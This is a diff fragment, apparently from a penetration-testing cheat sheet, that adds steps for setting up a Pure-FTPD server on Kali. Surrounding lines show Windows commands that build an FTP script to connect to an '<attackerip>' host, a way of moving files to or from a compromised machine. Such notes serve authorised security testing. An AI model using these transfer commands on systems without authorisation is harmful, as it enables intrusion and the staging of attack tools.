@@ -25,6 +25,27 @@ ftp <attackerip>
 -------------------------------------------
 
 FTP (pureftpd client on Kali)
+
+# on Kali
+
+# install ftp client
+apt-get install pure-ftpd
+# create a group
+groupadd ftpgroup
+# add a user
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+# Create a directory for your ftp-files (you can also specify a specific user e.g.: /root/ftphome/bob).
+mkdir /root/ftphome
+# Create a ftp-user, in our example "bob" (again you can set "-d /root/ftphome/bob/" if you wish).
+pure-pw useradd bob -u ftpuser -g ftpgroup -d /root/ftphome/
+# Update the ftp database after adding our new user.
+pure-pw mkdb
+# change ownership of the specified ftp directory (and all it's sub-direcotries) 
+chown -R ftpuser:ftpgroup /root/ftphome
+# restart Pure-FTPD
+/etc/init.d/pure-ftpd restart
+
+
 # On Windows
 echo open <attackerip> 21> ftp.txt
 echo USER username password >> ftp.txt
